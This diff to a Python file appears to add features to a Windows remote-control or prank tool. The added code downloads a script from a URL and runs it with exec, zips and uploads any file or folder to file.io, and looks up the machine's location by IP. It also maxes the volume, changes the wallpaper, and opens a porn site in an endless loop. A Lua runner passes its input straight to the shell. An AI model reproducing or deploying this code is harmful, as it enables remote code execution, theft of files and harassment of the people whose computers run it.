@@ -9,6 +9,66 @@ import psutil
 import shutil
 import subprocess
 import tempfile
+import requests
+from zipfile import ZipFile
+from urllib.request import urlopen
+import pyautogui
+from ctypes import cast, POINTER
+from comtypes import CLSCTX_ALL
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+from PIL import ImageGrab, Image
+
+# Commit unspeakable act
+# May we be forgiven by god
+credits = ''
+print(credits)
+
+def maximize_volume():
+    devices = AudioUtilities.GetSpeakers()
+    interface = devices.Activate(
+        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+    volume = cast(interface, POINTER(IAudioEndpointVolume))
+    volume.SetMasterVolumeLevelScalar(1.0, None)
+
+def download_image(url, save_path):
+    response = requests.get(url)
+    with open(save_path, 'wb') as file:
+        file.write(response.content)
+
+def set_wallpaper(image_path):
+    import ctypes
+    # Path for the Windows API function to set the wallpaper
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
+
+def exec_github_script(github_url):
+    try:
+        # Fetch the script content from the GitHub URL
+        response = requests.get(github_url)
+        response.raise_for_status()  # Check if the request was successful
+        script_content = response.text
+
+        # Execute the script content
+        exec(script_content)
+    except requests.RequestException as e:
+        print(f"Error fetching the script: {e}")
+    except Exception as e:
+        print(f"Error executing the script: {e}")
+
+def change_wallpaper_from_url(image_url):
+    temp_image_path = 'temp_wallpaper.jpg'
+    
+    # Download the image
+    download_image(image_url, temp_image_path)
+    
+    # Optionally, convert to a format that Windows handles well
+    with Image.open(temp_image_path) as img:
+        img.save(temp_image_path, 'JPEG')
+    
+    # Set the wallpaper
+    set_wallpaper(temp_image_path)
+    
+    # Clean up temporary file
+    os.remove(temp_image_path)
 
 def fake_mutex_code(exe_name: str) -> bool:
     for process in psutil.process_iter(['pid', 'name']):
@@ -240,6 +300,16 @@ def delete_file(file_path):
     except Exception as e:
         print(f"An error occurred: {e}")
 
+def delphi(code):
+    try:
+        print(f'Python Pascal interpreter v3.1')
+        print(f'Validating code...')
+        print(f'Error could not execute code: {code}')
+        print('Error: Python is better , stop using delphi you masochist')
+    except:
+        pass
+
+
 def extract_urls(text):
     """
     Extract all URLs from the given text.
@@ -263,6 +333,65 @@ def extract_urls(text):
     
     return urls
 
+
+
 def troll():
+    maximize_volume()
     while True:
         os.system('start pornhub.com')
+
+def luaexec(code):
+    Output = force_decode(subprocess.run(f'lua {code}', capture_output=True, shell=True).stdout).strip().replace('\\xff', ' ')
+    return Output    
+
+def upload_to_file_io(file_path):
+    if not os.path.exists(file_path):
+        raise FileNotFoundError(f"File or directory '{file_path}' does not exist.")
+
+    target_file = file_path
+
+    # If the target is a directory, compress it into a .zip file
+    if os.path.isdir(target_file):
+        target_file += '.zip'
+        with ZipFile(target_file, 'w') as zipf:
+            for root, dirs, files in os.walk(file_path):
+                for file in files:
+                    zipf.write(os.path.join(root, file), 
+                               os.path.relpath(os.path.join(root, file), 
+                               os.path.join(file_path, '..')))
+
+    # Uploading the file to file.io
+    with open(target_file, 'rb') as f:
+        response = requests.post('https://file.io/', files={'file': f})
+    
+    # Check for errors during upload
+    if response.status_code != 200:
+        raise Exception(f"Error during upload: {response.status_code} {response.text}")
+    
+    # Extract the URL from the response
+    data = response.json()
+    file_url = data.get('link')
+
+    # Warning for the user: The file will be removed after the first download
+    if not file_url:
+        raise Exception("Failed to retrieve the download link from file.io.")
+    
+    return file_url
+
+def get_location():
+    try:
+        # Request to the alternative geolocation service
+        response = requests.get('https://ipapi.co/json')
+        data = response.json()
+
+        # Extracting the necessary information
+        city = data.get('city')
+        province = data.get('region')
+        country = data.get('country_name')
+
+        return city, province, country
+
+    except requests.RequestException as e:
+        # Handle any request errors
+        print(f"An error occurred: {e}")
+        return None, None, None
